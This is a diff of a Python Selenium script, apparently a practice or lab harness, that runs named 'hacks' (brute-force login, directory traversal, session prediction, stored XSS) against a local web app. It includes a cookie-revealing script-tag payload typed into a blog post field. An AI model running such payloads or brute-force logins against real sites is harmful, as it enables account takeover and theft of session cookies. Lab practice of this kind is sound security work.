@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from pyvirtualdisplay import Display
@@ -67,7 +68,7 @@ def sess_pred(driver):
         print("\n Trying {}".format(url))
         driver.get(url)
         r = requests.get(url)
-        print r.status_code
+        print(r.status_code)
         if r.status_code != 200:
             run = False
         else:
@@ -86,6 +87,7 @@ def xss_attack(driver):
     driver.get("http://127.0.0.1:5000/blog")
     elem = driver.find_element_by_name("post")
     elem.send_keys("<script>document.write(document.cookie);</script>")
+    elem.send_keys(Keys.RETURN)
 
     print(driver.page_source)
 
@@ -94,13 +96,15 @@ def xss_attack(driver):
 
 display = Display(visible=0, size=(1024, 768))
 display.start()
-# In[9]:
 
 driver = webdriver.Firefox()
-#brute_force_login(driver)
+
+## Uncomment one of the functions below to run a specific hack
+
+brute_force_login(driver)
 #directory_transversal(driver)
 #sess_pred(driver)
-xss_attack(driver)
+#xss_attack(driver)
 
 driver.close()
 display.stop()
